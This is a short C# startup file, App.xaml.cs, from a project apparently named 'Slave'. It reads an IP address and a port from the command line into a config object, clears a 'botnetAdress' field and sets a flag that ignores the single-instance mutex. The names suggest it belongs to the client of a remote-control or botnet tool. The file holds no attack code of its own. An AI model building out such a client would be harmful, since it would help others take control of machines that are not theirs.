using Slave.Core;
using System.Windows;

namespace Slave
{
    /// <summary>
    /// Interaction logic for App.xaml
    /// </summary>
    public partial class App : Application
    {
        void App_Startup(object sender, StartupEventArgs e)
        {
            if (e.Args.Length == 2)
            {
                if (int.TryParse(e.Args[1], out int port))
                {
                    Config.botnetAdress = null;
                    Config.IgnoreMutex = true;
                    Config.ip = e.Args[0];
                    Config.port = port;
                }
            }
        }
    }
}
